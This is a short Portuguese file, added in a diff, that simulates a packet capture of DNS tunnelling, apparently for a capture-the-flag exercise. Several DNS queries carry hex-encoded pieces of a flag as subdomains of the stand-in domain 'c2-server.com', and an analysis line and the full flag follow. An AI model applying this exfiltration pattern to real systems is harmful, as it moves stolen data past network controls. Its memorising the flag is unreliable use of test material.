@@ -1,0 +1,28 @@
+Simulação de tunelamento DNS - Exfiltração de dados via DNS
+
+Frame 1: 192.168.1.100 → 8.8.8.8 (DNS Query)
+  • Transaction ID: 0x1111
+  • Query: 6578616d706c65.c2-server.com (Type A)
+  • Data: "example" em hex
+
+Frame 2: 8.8.8.8 → 192.168.1.100 (DNS Response)
+  • Transaction ID: 0x1111
+  • Response: 1.2.3.4 (sem importância, apenas keep-alive)
+
+Frame 3: 192.168.1.100 → 8.8.8.8 (DNS Query)
+  • Transaction ID: 0x2222
+  • Query: 666c61677b74686b65.c2-server.com (Type A)
+  • Data: "flag{thke" em hex
+
+Frame 4: 192.168.1.100 → 8.8.8.8 (DNS Query)
+  • Transaction ID: 0x3333
+  • Query: 792d657866696c.c2-server.com (Type A)
+  • Data: "y-exfil" em hex
+
+Frame 5: 192.168.1.100 → 8.8.8.8 (DNS Query)
+  • Transaction ID: 0x4444
+  • Query: 74726174696f6e7d.c2-server.com (Type A)
+  • Data: "tration}" em hex
+
+Análise: Os subdomínios contêm dados exfiltrados em hexadecimal
+Flag completa: flag{thkey-exfiltration}
